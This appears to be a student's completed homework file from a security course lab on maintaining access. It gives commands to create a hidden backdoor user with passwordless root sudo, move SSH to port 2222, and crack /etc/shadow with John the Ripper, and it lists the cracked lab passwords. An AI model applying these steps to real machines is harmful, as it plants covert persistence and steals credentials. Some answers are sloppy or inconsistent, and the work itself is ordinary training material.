## Week 6 Homework Submission File: Advanced Bash - Owning the System

Please edit this file by adding the solution commands on the line below the prompt. 

Save and submit the completed file for your homework submission.

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
    - useradd sysd

2. Give your secret user a password: 
    -  passwd sysd

3. Give your secret user a system UID < 1000:
    - Nano /etc/passwd
    edit sysd to be 900:900

4. Give your secret user the same GID:
   - Nano /etc/passwd
    edit sysd to be 900:900
5. Give your secret user full `sudo` access without the need for a password:
   -  sudo visudo
   sysd ALL=(ALL) NOPASSWD:ALL

6. Test that `sudo` access works without your password: sudo -l 

   

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

    ```bash
    Port 2222
    #AddressFamily any
    #ListenAddress 0.0.0.0
    #ListenAddress :: 
    ```

**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:
    - service ssh restart

2. Exit the `root` account:
    - exit 

3. SSH to the target machine using your `sysd` account and port `2222`:
    - ssh sysd@192.168.5.105 -p 2222
    yes 
    password

4. Use `sudo` to switch to the root user:
    - sudo su
    password


**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

    - ssh sysd@192.168.6.105 -p 2222

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:

    - john /etc/shadow
    sysadmin:passw0rd
    student:Goodluck!
    mitnik:trustno1
    babbage:freedom
    lovelace:dragon
    stallman:computer
    turning:lakers
    sysd:sysd
